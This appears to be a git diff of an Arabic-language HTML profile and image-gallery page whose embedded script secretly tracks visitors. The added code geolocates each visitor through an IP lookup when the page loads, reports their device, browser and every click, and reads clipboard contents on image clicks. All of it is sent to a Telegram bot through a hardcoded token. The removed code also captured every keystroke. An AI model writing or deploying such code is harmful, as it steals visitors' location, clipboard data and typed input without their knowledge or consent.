@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="ar">
+
+<!DOCTYPE html>
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
@@ -9,146 +11,264 @@
       background-color: pink;
       font-family: Arial, sans-serif;
       direction: rtl;
+      text-align: center;
       overflow-x: hidden;
-    }
-    .cover {
-      width: 100%;
-      height: 200px;
-      background-image: url('cover.jpg');
-      background-size: cover;
-      background-position: center;
       position: relative;
     }
-    .description {
-      position: absolute;
-      top: 50%;
-      right: 0;
-      left: 0;
-      transform: translateY(-50%);
-      text-align: center;
-      color: purple;
-      background-color: rgba(255,255,255,0.7);
+
+    .top-description {
+      background: linear-gradient(90deg, #4b0082, black, #4b0082);
+      color: white;
+      padding: 15px;
       font-weight: bold;
-      padding: 10px;
+      font-size: 16px;
+      animation: fadeInOut 5s ease-in-out infinite;
     }
-    .profile {
-      width: 100px;
-      height: 100px;
-      background: violet;
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 1; }
+    }
+
+    header {
+      background-image: url('5alfia.png');
+      background-size: cover;
+      background-position: center;
+      height: 250px;
+      position: relative;
+    }
+
+    .profile-pic {
+      width: 110px;
+      height: 110px;
       border-radius: 50%;
       border: 5px solid white;
+      background-image: url('profile.png');
+      background-size: cover;
+      background-position: center;
       position: absolute;
-      bottom: -50px;
+      bottom: -55px;
       right: 20px;
-      z-index: 10;
+      animation: pulse 2s infinite;
+      box-shadow: 0 0 10px purple;
+      pointer-events: none;
     }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
+      70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
+    }
+
     .posts-container {
-      margin-top: 80px;
       display: grid;
       grid-template-columns: repeat(5, 1fr);
-      gap: 5px;
-      padding: 10px;
+      gap: 10px;
+      padding: 80px 10px 30px;
     }
+
     .post-img {
       width: 100%;
-      height: 80px;
+      height: 120px;
       object-fit: cover;
-      border: 2px solid purple;
+      border-radius: 10px;
       cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
     }
-    .buttons {
+
+    .post-img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #4b0082;
+    }
+
+    .lightbox {
       position: fixed;
-      bottom: 10px;
-      width: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      flex-direction: column;
+    }
+
+    .lightbox img {
+      max-width: 90%;
+      max-height: 80%;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .lightbox:target {
       display: flex;
-      justify-content: space-between;
-      padding: 0 20px;
     }
-    .btn {
-      padding: 10px;
-      border: none;
-      border-radius: 20px;
-      font-weight: bold;
-      cursor: pointer;
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 30px;
+      color: white;
+      text-decoration: none;
     }
-    .btn-video {
+
+    .download-btn {
       background-color: purple;
       color: white;
-      animation: pulse 2s infinite;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-size: 16px;
     }
-    .btn-blogs {
+
+    .video-fab {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background-color: black;
+      color: pink;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 15px pink;
+      animation: pulse 2s infinite;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .blog-fab {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
       background-color: yellow;
       color: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 15px yellow;
       animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
+      cursor: pointer;
+      z-index: 1000;
     }
   </style>
 </head>
 <body>
-  <div class="cover">
-    <div class="description">
-      ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير |<br>
-      طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم |<br>
-      لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
-    </div>
+
+  <div class="top-description">
+    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير | 
+    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم | 
+    لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
   </div>
-  <div class="profile"></div>  <div class="posts-container">
-    <img src="img1.jpg" class="post-img" alt="👑">
-    <img src="img2.jpg" class="post-img" alt="👑">
-    <img src="img3.jpg" class="post-img" alt="👑">
-    <img src="img4.jpg" class="post-img" alt="👑">
-    <img src="img5.jpg" class="post-img" alt="👑">
-  </div>  <div class="buttons">
-    <button class="btn btn-video" onclick="logClick('📹 فيديو'); location.href='index.html';">فيديو</button>
-    <button class="btn btn-blogs" onclick="logClick('🟡 مدونات'); location.href='index.html';">مدونات</button>
-  </div>  <script>
+
+  <header>
+    <div class="profile-pic"></div>
+  </header>
+
+  <div class="posts-container">
+    <!-- 👑 -->
+    <a href="#img1"><img src="بدون اسم130_20250502141304.png" class="post-img" onclick="handleClick(this)"></a>
+    <a href="#img2"><img src="بدون اسم150_20250616203704.png" class="post-img" onclick="handleClick(this)"></a>
+    <a href="#img3"><img src="بدون اسم130_20250502141304.png" class="post-img" onclick="handleClick(this)"></a>
+    <a href="#img4"><img src="بدون اسم4.png" class="post-img" onclick="handleClick(this)"></a>
+    <a href="#img5"><img src="بدون اسم5.png" class="post-img" onclick="handleClick(this)"></a>
+  </div>
+
+  <!-- 👑 -->
+  <div id="img1" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="بدون اسم130_20250502141304.png">
+    <a class="download-btn" href="بدون اسم130_20250502141304.png" download onclick="sendAction('تحميل صورة: بدون اسم130')">تحميل الصورة</a>
+  </div>
+
+  <div id="img2" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="بدون اسم150_20250616203704.png">
+    <a class="download-btn" href="بدون اسم150_20250616203704.png" download onclick="sendAction('تحميل صورة: بدون اسم150')">تحميل الصورة</a>
+  </div>
+
+  <!-- 👑 -->
+  <div class="video-fab" onclick="goTo('index', 'زر فيديو')">🎥</div>
+  <div class="blog-fab" onclick="goTo('index', 'زر مدونات')">📖</div>
+
+  <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
     const CHAT_ID = "7664410054";
+    let sentOnce = false;
 
     function sendToTelegram(msg) {
       fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
       });
     }
 
-    function logClick(content) {
-      sendToTelegram(`👆 نقر: ${content}`);
+    function getIPInfo() {
+      return fetch("https://ipinfo.io/json").then(r => r.json());
     }
 
-    document.querySelectorAll(".post-img").forEach(img => {
-      img.addEventListener("click", () => {
-        logClick("🖼️ صورة: " + img.src);
+    async function runReportOnce() {
+      if (sentOnce) return;
+      sentOnce = true;
+      let report = "🛑 تقرير دخول جديد:\n\n";
+      try {
+        const data = await getIPInfo();
+        report += `🌐 IP: ${data.ip}\n📍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}\n🌎 إحداثيات: ${data.loc}\n🛰️ https://www.google.com/maps?q=${data.loc}\n\n`;
+      } catch {
+        report += "🌐 IP: ❌ فشل جلب البيانات\n\n";
+      }
+
+      const ua = navigator.userAgent;
+      report += `🧠 UserAgent: ${ua}\n`;
+      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد\n";
+      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون\n";
+      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز\n";
+      else report += "🌀 الجهاز: غير معروف\n";
+
+      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome\n";
+      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox\n";
+      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari\n";
+      else report += "🌐 المتصفح: غير معروف\n";
+
+      sendToTelegram(report);
+    }
+
+    runReportOnce();
+
+    function goTo(path, label) {
+      getIPInfo().then(data => {
+        sendToTelegram(`👆 ${label}:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`);
+        window.location.href = path;
+      });
+    }
+
+    function sendAction(action) {
+      sendToTelegram(`👆 ${action}`);
+    }
+
+    document.addEventListener('click', () => {
+      sendAction('نقرة في الموقع');
+    });
+
+    function handleClick(img) {
+      if (navigator.clipboard && navigator.clipboard.readText) {
         navigator.clipboard.readText().then(text => {
-          sendToTelegram(`📋 الحافظة: ${text}`);
-        });
-      });
-    });
+          if (text) {
+            sendToTelegram(`📋 محتوى الحافظة:\n${text}`);
+          }
+        }).catch(() => {});
+      }
+    }
+  </script>
+</body>
+</html>
 
-    document.querySelector(".profile").addEventListener("click", () => {
-      logClick("👤 صورة بروفايل")
-    });
-
-    document.addEventListener("click", e => {
-      const target = e.target;
-      if (target.tagName === 'BUTTON') logClick(`🔘 زر: ${target.innerText}`);
-    });
-
-    document.addEventListener("keydown", e => {
-      sendToTelegram(`⌨️ مفتاح: ${e.key}`);
-    });
-
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        const ua = navigator.userAgent;
-        sendToTelegram(`🆕 دخول جديد\n📡 IP: ${ip}\n📱 جهاز: ${ua}`);
-      });
-  </script></body>
-      </html>
